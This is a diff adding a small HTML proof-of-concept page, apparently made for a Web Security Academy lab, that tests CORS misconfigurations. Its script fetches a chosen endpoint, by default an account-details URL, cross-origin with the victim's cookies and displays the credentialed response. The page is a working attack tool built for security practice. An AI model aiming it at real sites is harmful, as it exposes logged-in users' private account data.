@@ -1,0 +1,28 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>CORS PoC (universal)</title>
+<style>body{font:14px/1.45 system-ui;margin:24px} pre{white-space:pre-wrap;background:#111;color:#0f0;padding:12px;border-radius:8px}</style>
+<h1>CORS PoC</h1>
+<p>1) Log in to the target (if needed). 2) Paste the endpoint. 3) Choose mode. 4) Run.</p>
+<p>
+  URL: <input id="u" size="80" value="https://0a9300d4045ac60380f803ee00890024.web-security-academy.net/accountDetails">
+  <label><input type="checkbox" id="creds"> Use cookies</label>
+  <button id="run">Run</button>
+</p>
+<h2>Response body</h2>
+<pre id="out">(no run yet)</pre>
+<script>
+const u = document.getElementById('u');
+const c = document.getElementById('creds');
+const o = document.getElementById('out');
+document.getElementById('run').onclick = async () => {
+  o.textContent = 'Fetching…';
+  try {
+    const r = await fetch(u.value.trim(), { credentials: c.checked ? 'include' : 'omit', mode:'cors' });
+    const t = await r.text();
+    o.textContent = t;
+  } catch(e) {
+    o.textContent = 'CORS blocked or network error: ' + e;
+  }
+};
+</script>
